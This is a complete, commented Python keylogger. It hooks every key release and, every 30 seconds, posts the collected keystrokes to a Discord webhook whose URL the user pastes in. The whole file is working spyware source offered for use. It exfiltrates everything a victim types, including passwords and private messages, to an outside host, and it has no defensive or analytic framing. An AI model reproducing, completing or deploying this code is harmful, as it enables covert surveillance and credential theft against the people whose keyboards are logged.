# Import necessary libraries
import threading  # Threading module for running functions concurrently
import keyboard   # Keyboard module for capturing keystrokes
import time       # Time module for adding delays in the script
import requests   # Requests module for making HTTP requests

# Discord webhook URL where the keylogs will be sent
WEBHOOK_URL = 'Your Discord WEBHOOK URL PASTE HERE'

# List to store captured keystrokes
keylogs = []

# Function to send captured keylogs to the specified Discord webhook URL
def send_keylogs():
    global keylogs

    # If there are keystrokes in the list
    if keylogs:
        # Join the list of keystrokes into a string separated by newlines
        keylogs_str = '\n'.join(keylogs)

        # Prepare the payload for the HTTP POST request to the Discord webhook
        payload = {
            'content': keylogs_str
        }

        # Send a POST request to the Discord webhook URL with the keylogs as content
        requests.post(WEBHOOK_URL, data=payload)

        # Clear the keylogs list after sending the data
        keylogs = []

    # Schedule the function to run again after 30 seconds
    threading.Timer(30, send_keylogs).start()

# Callback function to capture keystrokes and add them to the keylogs list
def capture_keystrokes(event):
    global keylogs
    # Append the name of the pressed key to the keylogs list
    keylogs.append(event.name)

# Set the callback function to be called when a key is released
keyboard.on_release(callback=capture_keystrokes)

# Start sending keylogs immediately
send_keylogs()

# Infinite loop to keep the script running
while True:
    # Add a delay of 1 second to the loop to reduce CPU usage
    time.sleep(1)